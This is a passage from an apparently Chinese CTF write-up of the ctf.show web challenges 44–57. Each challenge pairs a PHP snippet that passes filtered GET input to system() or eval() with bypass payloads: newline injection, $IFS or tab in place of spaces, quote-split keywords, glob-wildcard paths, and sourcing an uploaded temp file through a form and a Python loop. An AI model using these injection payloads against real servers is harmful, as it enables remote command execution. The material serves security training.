+/*
+# -*- coding: utf-8 -*-
+  Author: h1xa
+  Date:   2020-09-05 20:49:30
+  Last Modified by:   h1xa
+  Last Modified time: 2020-09-05 21:32:01
+  email: h1xa@ctfer.com
+  link: https://ctfer.com
+
+*/
+
+
+if(isset($_GET[&#39;c&#39;]))&#123;
+    $c=$_GET[&#39;c&#39;];
+    if(!preg_match(&quot;/;|cat|flag/i&quot;, $c))&#123;
+        system($c.&quot; &gt;/dev/null 2&gt;&amp;1&quot;);
+    &#125;
+&#125;else&#123;
+    highlight_file(__FILE__);
+&#125; 
+</code></pre>
+<p>payload</p>
+<pre><code>?c=ls%0a
+?c=ls%0a&amp;&amp;
+?c=ls%0a||
+?c=nl fla*%0a
+</code></pre>
+<h1 id="web45"><a href="#web45" class="headerlink" title="web45"></a>web45</h1><pre><code class="php"> &lt;?php
+
+/*
+# -*- coding: utf-8 -*-
+  Author: h1xa
+  Date:   2020-09-05 20:49:30
+  Last Modified by:   h1xa
+  Last Modified time: 2020-09-05 21:35:34
+  email: h1xa@ctfer.com
+  link: https://ctfer.com
+
+*/
+
+
+if(isset($_GET[&#39;c&#39;]))&#123;
+    $c=$_GET[&#39;c&#39;];
+    if(!preg_match(&quot;/\;|cat|flag| /i&quot;, $c))&#123;
+        system($c.&quot; &gt;/dev/null 2&gt;&amp;1&quot;);
+    &#125;
+&#125;else&#123;
+    highlight_file(__FILE__);
+&#125; 
+</code></pre>
+<p>payload</p>
+<pre><code>?c=nl%09fl*%0a        php下%09代替空格
+?c=echo$IFS`tac$IFS*`%0A     $IFS代表shell里面的空格
+</code></pre>
+<h1 id="web46"><a href="#web46" class="headerlink" title="web46"></a>web46</h1><h2 id="反斜杠绕过关键词过滤"><a href="#反斜杠绕过关键词过滤" class="headerlink" title="反斜杠绕过关键词过滤"></a>反斜杠绕过关键词过滤</h2><pre><code class="php"> &lt;?php
+
+/*
+# -*- coding: utf-8 -*-
+  Author: h1xa
+  Date:   2020-09-05 20:49:30
+  Last Modified by:   h1xa
+  Last Modified time: 2020-09-05 21:50:19
+  email: h1xa@ctfer.com
+  link: https://ctfer.com
+
+*/
+
+
+if(isset($_GET[&#39;c&#39;]))&#123;
+    $c=$_GET[&#39;c&#39;];
+    if(!preg_match(&quot;/\;|cat|flag| |[0-9]|\\$|\*/i&quot;, $c))&#123;
+        system($c.&quot; &gt;/dev/null 2&gt;&amp;1&quot;);
+    &#125;
+&#125;else&#123;
+    highlight_file(__FILE__);
+&#125; 
+</code></pre>
+<p>payload</p>
+<pre><code>?c=nl%09fla\g.php%0a
+?c=nl%09fla\g.php||
+</code></pre>
+<h1 id="web47"><a href="#web47" class="headerlink" title="web47"></a>web47</h1><h2 id="“双引号绕过关键词过滤"><a href="#“双引号绕过关键词过滤" class="headerlink" title="“双引号绕过关键词过滤"></a>“双引号绕过关键词过滤</h2><pre><code class="php"> &lt;?php
+
+/*
+# -*- coding: utf-8 -*-
+  Author: h1xa
+  Date:   2020-09-05 20:49:30
+  Last Modified by:   h1xa
+  Last Modified time: 2020-09-05 21:59:23
+  email: h1xa@ctfer.com
+  link: https://ctfer.com
+
+*/
+
+
+if(isset($_GET[&#39;c&#39;]))&#123;
+    $c=$_GET[&#39;c&#39;];
+    if(!preg_match(&quot;/\;|cat|flag| |[0-9]|\\$|\*|more|less|head|sort|tail/i&quot;, $c))&#123;
+        system($c.&quot; &gt;/dev/null 2&gt;&amp;1&quot;);
+    &#125;
+&#125;else&#123;
+    highlight_file(__FILE__);
+&#125;
+</code></pre>
+<p>payload</p>
+<pre><code>?c=nl&lt;fla&#39;&#39;g.php||
+</code></pre>
+<h1 id="web48"><a href="#web48" class="headerlink" title="web48"></a>web48</h1><pre><code class="php"> &lt;?php
+
+/*
+# -*- coding: utf-8 -*-
+  Author: h1xa
+  Date:   2020-09-05 20:49:30
+  Last Modified by:   h1xa
+  Last Modified time: 2020-09-05 22:06:20
+  email: h1xa@ctfer.com
+  link: https://ctfer.com
+
+*/
+
+
+if(isset($_GET[&#39;c&#39;]))&#123;
+    $c=$_GET[&#39;c&#39;];
+    if(!preg_match(&quot;/\;|cat|flag| |[0-9]|\\$|\*|more|less|head|sort|tail|sed|cut|awk|strings|od|curl|\`/i&quot;, $c))&#123;
+        system($c.&quot; &gt;/dev/null 2&gt;&amp;1&quot;);
+    &#125;
+&#125;else&#123;
+    highlight_file(__FILE__);
+&#125;
+</code></pre>
+<p>payload</p>
+<pre><code>?c=nl&lt;fla&#39;&#39;g.php||
+</code></pre>
+<h1 id="web49"><a href="#web49" class="headerlink" title="web49"></a>web49</h1><h2 id="linux绕过关键词过滤集合"><a href="#linux绕过关键词过滤集合" class="headerlink" title="linux绕过关键词过滤集合"></a>linux绕过关键词过滤集合</h2><pre><code class="php"> &lt;?php
+
+/*
+# -*- coding: utf-8 -*-
+  Author: h1xa
+  Date:   2020-09-05 20:49:30
+  Last Modified by:   h1xa
+  Last Modified time: 2020-09-05 22:22:43
+  email: h1xa@ctfer.com
+  link: https://ctfer.com
+
+*/
+
+
+if(isset($_GET[&#39;c&#39;]))&#123;
+    $c=$_GET[&#39;c&#39;];
+    if(!preg_match(&quot;/\;|cat|flag| |[0-9]|\\$|\*|more|less|head|sort|tail|sed|cut|awk|strings|od|curl|\`|\%/i&quot;, $c))&#123;
+        system($c.&quot; &gt;/dev/null 2&gt;&amp;1&quot;);
+    &#125;
+&#125;else&#123;
+    highlight_file(__FILE__);
+&#125; 
+</code></pre>
+<p>payload</p>
+<pre><code>?c=nl%09fla\g.php||
+?c=nl%09fla\g.php%0a
+?c=nl%09fla&#39;&#39;g.php%0a
+?c=nl%09fla&quot;&quot;g.php%0a
+?c=vi%09fla\g.php%0a
+?c=tac%09fla\g.php%0a
+?c=uniq%09fla\g.php%0a
+?c=nl&lt;fla\g.php||
+?c=nl&lt;fla&#39;&#39;g.php||
+?c=nl&lt;fla&quot;&quot;g.php||
+?c=nl&lt;fla\g.php%26
+</code></pre>
+<h1 id="web50"><a href="#web50" class="headerlink" title="web50"></a>web50</h1><pre><code class="php"> &lt;?php
+
+/*
+# -*- coding: utf-8 -*-
+  Author: h1xa
+  Date:   2020-09-05 20:49:30
+  Last Modified by:   h1xa
+  Last Modified time: 2020-09-05 22:32:47
+  email: h1xa@ctfer.com
+  link: https://ctfer.com
+
+*/
+
+
+if(isset($_GET[&#39;c&#39;]))&#123;
+    $c=$_GET[&#39;c&#39;];
+    if(!preg_match(&quot;/\;|cat|flag| |[0-9]|\\$|\*|more|less|head|sort|tail|sed|cut|awk|strings|od|curl|\`|\%|\x09|\x26/i&quot;, $c))&#123;
+        system($c.&quot; &gt;/dev/null 2&gt;&amp;1&quot;);
+    &#125;
+&#125;else&#123;
+    highlight_file(__FILE__);
+&#125; 
+</code></pre>
+<p>payload</p>
+<pre><code>?c=nl&lt;fla&quot;&quot;g.php||
+?c=nl&lt;fla\g.php||
+</code></pre>
+<h1 id="web51"><a href="#web51" class="headerlink" title="web51"></a>web51</h1><pre><code class="php"> &lt;?php
+
+/*
+# -*- coding: utf-8 -*-
+  Author: h1xa
+  Date:   2020-09-05 20:49:30
+  Last Modified by:   h1xa
+  Last Modified time: 2020-09-05 22:42:52
+  email: h1xa@ctfer.com
+  link: https://ctfer.com
+
+*/
+
+
+if(isset($_GET[&#39;c&#39;]))&#123;
+    $c=$_GET[&#39;c&#39;];
+    if(!preg_match(&quot;/\;|cat|flag| |[0-9]|\\$|\*|more|less|head|sort|tail|sed|cut|tac|awk|strings|od|curl|\`|\%|\x09|\x26/i&quot;, $c))&#123;
+        system($c.&quot; &gt;/dev/null 2&gt;&amp;1&quot;);
+    &#125;
+&#125;else&#123;
+    highlight_file(__FILE__);
+&#125; 
+</code></pre>
+<p>payload</p>
+<pre><code>?c=nl&lt;fla&quot;&quot;g.php||
+?c=nl&lt;fla\g.php||
+?c=nl&lt;fla&#39;&#39;g.php||
+</code></pre>
+<h1 id="web52"><a href="#web52" class="headerlink" title="web52"></a>web52</h1><h2 id="linux-IFS代替空格"><a href="#linux-IFS代替空格" class="headerlink" title="linux$IFS代替空格"></a>linux$IFS代替空格</h2><pre><code class="php"> &lt;?php
+
+/*
+# -*- coding: utf-8 -*-
+  Author: h1xa
+  Date:   2020-09-05 20:49:30
+  Last Modified by:   h1xa
+  Last Modified time: 2020-09-05 22:50:30
+  email: h1xa@ctfer.com
+  link: https://ctfer.com
+
+*/
+
+
+if(isset($_GET[&#39;c&#39;]))&#123;
+    $c=$_GET[&#39;c&#39;];
+    if(!preg_match(&quot;/\;|cat|flag| |[0-9]|\*|more|less|head|sort|tail|sed|cut|tac|awk|strings|od|curl|\`|\%|\x09|\x26|\&gt;|\&lt;/i&quot;, $c))&#123;
+        system($c.&quot; &gt;/dev/null 2&gt;&amp;1&quot;);
+    &#125;
+&#125;else&#123;
+    highlight_file(__FILE__);
+&#125;
+</code></pre>
+<p>payload</p>
+<pre><code>?c=nl$IFS\fla\g.php||
+</code></pre>
+<h1 id="web53"><a href="#web53" class="headerlink" title="web53"></a>web53</h1><pre><code class="php"> &lt;?php
+
+/*
+# -*- coding: utf-8 -*-
+  Author: h1xa
+  Date:   2020-09-05 20:49:30
+  Last Modified by:   h1xa
+  Last Modified time: 2020-09-07 18:21:02
+  email: h1xa@ctfer.com
+  link: https://ctfer.com
+
+*/
+
+
+if(isset($_GET[&#39;c&#39;]))&#123;
+    $c=$_GET[&#39;c&#39;];
+    if(!preg_match(&quot;/\;|cat|flag| |[0-9]|\*|more|wget|less|head|sort|tail|sed|cut|tac|awk|strings|od|curl|\`|\%|\x09|\x26|\&gt;|\&lt;/i&quot;, $c))&#123;
+        echo($c);
+        $d = system($c);
+        echo &quot;&lt;br&gt;&quot;.$d;
+    &#125;else&#123;
+        echo &#39;no&#39;;
+    &#125;
+&#125;else&#123;
+    highlight_file(__FILE__);
+&#125;
+</code></pre>
+<p>payload</p>
+<pre><code>?c=c&#39;&#39;at$&#123;IFS&#125;fla&#39;&#39;g.p&#39;&#39;hp
+?c=nl$IFS\fla\g.php
+</code></pre>
+<h1 id="web54"><a href="#web54" class="headerlink" title="web54"></a>web54</h1><h2 id="统配执行语句-x2F-bin-x2F-c-IFS"><a href="#统配执行语句-x2F-bin-x2F-c-IFS" class="headerlink" title="???统配执行语句&#x2F;bin&#x2F;c??${IFS}????????"></a>???统配执行语句&#x2F;bin&#x2F;c??${IFS}????????</h2><pre><code class="php"> &lt;?php
+
+/*
+# -*- coding: utf-8 -*-
+  Author: Lazzaro
+  Date:   2020-09-05 20:49:30
+  Last Modified by:   h1xa
+  Last Modified time: 2020-09-07 19:43:42
+  email: h1xa@ctfer.com
+  link: https://ctfer.com
+
+*/
+
+
+if(isset($_GET[&#39;c&#39;]))&#123;
+    $c=$_GET[&#39;c&#39;];
+    if(!preg_match(&quot;/\;|.*c.*a.*t.*|.*f.*l.*a.*g.*| |[0-9]|\*|.*m.*o.*r.*e.*|.*w.*g.*e.*t.*|.*l.*e.*s.*s.*|.*h.*e.*a.*d.*|.*s.*o.*r.*t.*|.*t.*a.*i.*l.*|.*s.*e.*d.*|.*c.*u.*t.*|.*t.*a.*c.*|.*a.*w.*k.*|.*s.*t.*r.*i.*n.*g.*s.*|.*o.*d.*|.*c.*u.*r.*l.*|.*n.*l.*|.*s.*c.*p.*|.*r.*m.*|\`|\%|\x09|\x26|\&gt;|\&lt;/i&quot;, $c))&#123;
+        system($c);
+    &#125;
+&#125;else&#123;
+    highlight_file(__FILE__);
+&#125; 
+</code></pre>
+<p>payload</p>
+<pre><code>?c=/bin/c??$&#123;IFS&#125;????????
+?c=/bin/c??$IFS????????
+</code></pre>
+<h1 id="web55"><a href="#web55" class="headerlink" title="web55"></a>web55</h1><h2 id="统配base64执行语句-x2F-x2F-64"><a href="#统配base64执行语句-x2F-x2F-64" class="headerlink" title="???统配base64执行语句&#x2F;???&#x2F;????64 ????????"></a>???统配base64执行语句&#x2F;???&#x2F;????64 ????????</h2><pre><code class="php"> &lt;?php
+
+/*
+# -*- coding: utf-8 -*-
+  Author: Lazzaro
+  Date:   2020-09-05 20:49:30
+  Last Modified by:   h1xa
+  Last Modified time: 2020-09-07 20:03:51
+  email: h1xa@ctfer.com
+  link: https://ctfer.com
+
+*/
+
+// 你们在炫技吗？
+if(isset($_GET[&#39;c&#39;]))&#123;
+    $c=$_GET[&#39;c&#39;];
+    if(!preg_match(&quot;/\;|[a-z]|\`|\%|\x09|\x26|\&gt;|\&lt;/i&quot;, $c))&#123;
+        system($c);
+    &#125;
+&#125;else&#123;
+    highlight_file(__FILE__);
+&#125;
+</code></pre>
+<p>payload</p>
+<pre><code>?c=/???/????64 ????????
+</code></pre>
+<p><img class="lazyload lazyload-style-1" src="data:image/svg+xml;base64,PCEtLUFyZ29uTG9hZGluZy0tPgo8c3ZnIHdpZHRoPSIxIiBoZWlnaHQ9IjEiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgc3Ryb2tlPSIjZmZmZmZmMDAiPjxnPjwvZz4KPC9zdmc+"  data-original="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202204021330313.png" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC" alt="image-20220402133049186"></p>
+
+<p>法二</p>
+<p>看下面</p>
+<p><img class="lazyload lazyload-style-1" src="data:image/svg+xml;base64,PCEtLUFyZ29uTG9hZGluZy0tPgo8c3ZnIHdpZHRoPSIxIiBoZWlnaHQ9IjEiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgc3Ryb2tlPSIjZmZmZmZmMDAiPjxnPjwvZz4KPC9zdmc+"  data-original="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220403162441419.png" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC" alt="image-20220403162441419"></p>
+
+<p><img class="lazyload lazyload-style-1" src="data:image/svg+xml;base64,PCEtLUFyZ29uTG9hZGluZy0tPgo8c3ZnIHdpZHRoPSIxIiBoZWlnaHQ9IjEiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgc3Ryb2tlPSIjZmZmZmZmMDAiPjxnPjwvZz4KPC9zdmc+"  data-original="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220403162510204.png" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC" alt="image-20220403162510204"></p>
+
+<h2 id="phithon的无字母webshell"><a href="#phithon的无字母webshell" class="headerlink" title="phithon的无字母webshell"></a>phithon的无字母webshell</h2><h3 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h3><pre><code class="php">&lt;?php
+if(isset($_GET[&#39;code&#39;]))&#123;
+    $code = $_GET[&#39;code&#39;];
+    if(strlen($code)&gt;35)&#123;
+        die(&quot;Long.&quot;);
+    &#125;
+    if(preg_match(&quot;/[A-Za-z0-9_$]+/&quot;,$code))&#123;
+        die(&quot;NO.&quot;);
+    &#125;
+    eval($code);
+&#125;else&#123;
+    highlight_file(__FILE__);
+&#125;
+</code></pre>
+<h3 id="php7下"><a href="#php7下" class="headerlink" title="php7下"></a>php7下</h3><p>我们将代码放入index.php中,然后执行</p>
+<pre><code>docker run --rm -p 9090:80 -v `pwd`:/var/www/html php:7.2-apache
+</code></pre>
+<ul>
+<li>–rm 在容器退出时就能够自动清理容器内容部的文件系统</li>
+<li>-p 将本机的9090端口映射到容器80端口</li>
+<li>-v 指定挂载位置 `pwd`是将当前目录挂载到&#x2F;var&#x2F;www&#x2F;html目录下 </li>
+<li>php:7.2-apache :运行一个php:7.2-apache容器</li>
+</ul>
+<p>在php7之前是不允许使用($a)();这样的方法来执行动态函数的,在php7之后可以使用(‘phpinfo’)();来执行函数,第一个括号中可以任意的php表达</p>
+<pre><code>(~%8F%97%8F%96%91%99%90)();
+</code></pre>
+<p>就相当于phpinfo();这里的~代表取反的意思,而其中有不可见字符,就用url编码表示</p>
+<pre><code>&lt;?php
+echo ~urldecode(&#39;%8F%97%8F%96%91%99%90&#39;);
+#phpinfo
+</code></pre>
+<p><img class="lazyload lazyload-style-1" src="data:image/svg+xml;base64,PCEtLUFyZ29uTG9hZGluZy0tPgo8c3ZnIHdpZHRoPSIxIiBoZWlnaHQ9IjEiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgc3Ryb2tlPSIjZmZmZmZmMDAiPjxnPjwvZz4KPC9zdmc+"  data-original="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220403150504271.png" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC" alt="image-20220403150504271"></p>
+
+<h3 id="php5下"><a href="#php5下" class="headerlink" title="php5下"></a>php5下</h3><pre><code>docker run --rm -p 9090:80 -v `pwd`:/var/www/html php:5.6-apache
+</code></pre>
+<ul>
+<li>shell下可以使用.来执行任意脚本</li>
+<li>linux文件名支持用glob通配符代替</li>
+</ul>
+<p>. file执行文件,是不需要file有x权限的.那么,如果目标服务器上有一个我们可控的文件,那么就可以利用.来执行.我们可以发送一个上传文件的POST包,此时PHP会将我们上传的文件保存在临时文件夹下,默认的文件名是&#x2F;tmp&#x2F;phpxxxxxx,文件名的最后六个字符是随机大小写的.</p>
+<ul>
+<li>*可以代替0个及以上任意字符</li>
+<li>?可以代表1个任意字符</li>
+</ul>
+<p>那么,&#x2F;tmp&#x2F;phpxxxxxx就可以表示为&#x2F;*&#x2F;?????????或者&#x2F;???&#x2F;???????? </p>
+<p>但是在能够匹配上&#x2F;???&#x2F;?????????这个通配符的文件有很多</p>
+<p><img class="lazyload lazyload-style-1" src="data:image/svg+xml;base64,PCEtLUFyZ29uTG9hZGluZy0tPgo8c3ZnIHdpZHRoPSIxIiBoZWlnaHQ9IjEiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgc3Ryb2tlPSIjZmZmZmZmMDAiPjxnPjwvZz4KPC9zdmc+"  data-original="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220403154526590.png" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC" alt="image-20220403154526590"></p>
+
+<p>但是glob通配符还支持使用[^x]的方法来构造”这个位置不是字符x”.那么我们就可以使用这个姿势干掉&#x2F;bin&#x2F;run-parts</p>
+<pre><code>/???/???[^-]?????
+</code></pre>
+<p><img class="lazyload lazyload-style-1" src="data:image/svg+xml;base64,PCEtLUFyZ29uTG9hZGluZy0tPgo8c3ZnIHdpZHRoPSIxIiBoZWlnaHQ9IjEiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgc3Ryb2tlPSIjZmZmZmZmMDAiPjxnPjwvZz4KPC9zdmc+"  data-original="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220403154702204.png" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC" alt="image-20220403154702204"></p>
+
+<p>排除了第4个字符是-的文件，同样我们可以排除包含.的文件</p>
+<pre><code>/???/???[^-][^.][^.]?[^.]?
+</code></pre>
+<p><img class="lazyload lazyload-style-1" src="data:image/svg+xml;base64,PCEtLUFyZ29uTG9hZGluZy0tPgo8c3ZnIHdpZHRoPSIxIiBoZWlnaHQ9IjEiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgc3Ryb2tlPSIjZmZmZmZmMDAiPjxnPjwvZz4KPC9zdmc+"  data-original="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220403154718043.png" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC" alt="image-20220403154718043"></p>
+
+<p>跟正则表达式一样,glob支持利用[0-9]来表示一个范围</p>
+<p><img class="lazyload lazyload-style-1" src="data:image/svg+xml;base64,PCEtLUFyZ29uTG9hZGluZy0tPgo8c3ZnIHdpZHRoPSIxIiBoZWlnaHQ9IjEiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgc3Ryb2tlPSIjZmZmZmZmMDAiPjxnPjwvZz4KPC9zdmc+"  data-original="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220403154902410.png" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC" alt="image-20220403154902410"></p>
+
+<p>这里所有的文件名都是小写,只有php生成的临时文件包含大写字母,那么我们只要找到一个表示大写字母的glob通配符就可以了.易知大写字母位于@与[之间</p>
+<pre><code>/???/?????????[@-[]
+</code></pre>
+<p><img class="lazyload lazyload-style-1" src="data:image/svg+xml;base64,PCEtLUFyZ29uTG9hZGluZy0tPgo8c3ZnIHdpZHRoPSIxIiBoZWlnaHQ9IjEiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgc3Ryb2tlPSIjZmZmZmZmMDAiPjxnPjwvZz4KPC9zdmc+"  data-original="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220403155124971.png" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC" alt="image-20220403155124971"></p>
+
+<p>最后传入的是</p>
+<pre><code>?&gt;&lt;?=`. /???/????????[@-[]`;?&gt;
+</code></pre>
+<p>先写一个上传文件的html文件</p>
+<pre><code class="html">&lt;!DOCTYPE html&gt;
+&lt;html lang=&quot;en&quot;&gt;
+&lt;head&gt;
+    &lt;meta charset=&quot;UTF-8&quot;&gt;
+    &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt;
+    &lt;title&gt;POST数据包POC&lt;/title&gt;
+&lt;/head&gt;
+&lt;body&gt;
+&lt;form action=&quot;http://831fec7f-ff8b-4fe6-869c-d2d8e70dc2c4.challenge.ctf.show/&quot; method=&quot;post&quot; enctype=&quot;multipart/form-data&quot;&gt;
+&lt;!--链接是当前打开的题目链接--&gt;
+    &lt;label for=&quot;file&quot;&gt;文件名：&lt;/label&gt;
+    &lt;input type=&quot;file&quot; name=&quot;file&quot; id=&quot;file&quot;&gt;&lt;br&gt;
+    &lt;input type=&quot;submit&quot; name=&quot;submit&quot; value=&quot;提交&quot;&gt;
+&lt;/form&gt;
+&lt;/body&gt;
+&lt;/html&gt;
+    
+</code></pre>
+<p><img class="lazyload lazyload-style-1" src="data:image/svg+xml;base64,PCEtLUFyZ29uTG9hZGluZy0tPgo8c3ZnIHdpZHRoPSIxIiBoZWlnaHQ9IjEiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgc3Ryb2tlPSIjZmZmZmZmMDAiPjxnPjwvZz4KPC9zdmc+"  data-original="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220403161216118.png" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC" alt="image-20220403161216118"></p>
+
+<p>至于这里为什么要添加?&gt;如果我们通过&lt;?&#x3D;`ls`去执行就需要在啊前面添加?&gt;</p>
+<p>原因就是eval()函数相当于执行php代码,而&lt;?&#x3D;就相当于&lt;?php echo,在php7以上不管short_open_tag配置是不是开启都可以用.所以就相当于一个新的php文件,这样的话就需要将在前面的&lt;?php给闭合,不然不会执行</p>
+<pre><code>&lt;?php ?&gt;&lt;?=`ls`;
+</code></pre>
+<h1 id="web56"><a href="#web56" class="headerlink" title="web56"></a>web56</h1><pre><code class="php"> &lt;?php
+
+/*
+# -*- coding: utf-8 -*-
+  Author: Lazzaro
+  Date:   2020-09-05 20:49:30
+  Last Modified by:   h1xa
+  Last Modified time: 2020-09-07 22:02:47
+  email: h1xa@ctfer.com
+  link: https://ctfer.com
+
+*/
+
+// 你们在炫技吗？
+if(isset($_GET[&#39;c&#39;]))&#123;
+    $c=$_GET[&#39;c&#39;];
+    if(!preg_match(&quot;/\;|[a-z]|[0-9]|\\$|\(|\&#123;|\&#39;|\&quot;|\`|\%|\x09|\x26|\&gt;|\&lt;/i&quot;, $c))&#123;
+        system($c);
+    &#125;
+&#125;else&#123;
+    highlight_file(__FILE__);
+&#125; 
+</code></pre>
+<p>payload</p>
+<pre><code class="python">import requests
+
+while True:
+    url = &quot;http://7a1fe05e-90db-4af3-a0ec-c849297f8d16.challenge.ctf.show/?c=.+/???/????????[@-[]&quot;
+    r = requests.post(url,files=&#123;&quot;file&quot;:(&#39;1.php&#39;,b&#39;cat flag.php&#39;)&#125;)
+    if r.text.find(&quot;flag&quot;) &gt;0 :
+        print(r.text)
+        break
+</code></pre>
+<p><img class="lazyload lazyload-style-1" src="data:image/svg+xml;base64,PCEtLUFyZ29uTG9hZGluZy0tPgo8c3ZnIHdpZHRoPSIxIiBoZWlnaHQ9IjEiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgc3Ryb2tlPSIjZmZmZmZmMDAiPjxnPjwvZz4KPC9zdmc+"  data-original="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220403163219886.png" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC" alt="image-20220403163219886"></p>
+
+<h1 id="web57"><a href="#web57" class="headerlink" title="web57"></a>web57</h1><h2 id="linux构造数字"><a href="#linux构造数字" class="headerlink" title="linux构造数字"></a>linux构造数字</h2><pre><code class="php"> &lt;?php
+
+/*
+# -*- coding: utf-8 -*-
+  Author: h1xa
+  Date:   2020-09-05 20:49:30
+  Last Modified by:   h1xa
+  Last Modified time: 2020-09-08 01:02:56
+  email: h1xa@ctfer.com
+  link: https://ctfer.com
+*/
+
+// 还能炫的动吗？
+//flag in 36.php
+if(isset($_GET[&#39;c&#39;]))&#123;
+    $c=$_GET[&#39;c&#39;];
+    if(!preg_match(&quot;/\;|[a-z]|[0-9]|\`|\|\#|\&#39;|\&quot;|\`|\%|\x09|\x26|\x0a|\&gt;|\&lt;|\.|\,|\?|\*|\-|\=|\[/i&quot;, $c))&#123;
+        system(&quot;cat &quot;.$c.&quot;.php&quot;);
+    &#125;
+&#125;else&#123;
+    highlight_file(__FILE__);
+&#125;
+</code></pre>
+<p>要构造36这个数字</p>
+<p>shell作用</p>
+<ul>
+<li>${_}:代表上一次命令执行的结果</li>
+<li>$(()):做运算</li>
+</ul>
+<p>之前没有命令返回或者执行,结果应该是空,与<code>&quot;&quot;</code>等价又 <code>$((&quot;&quot;))</code>值为0,<code>$((~$((&quot;&quot;))))</code>值为-1,再做拼接:所以可以拼接得到-37 , -37取反得到36</p>
+<p>payload</p>
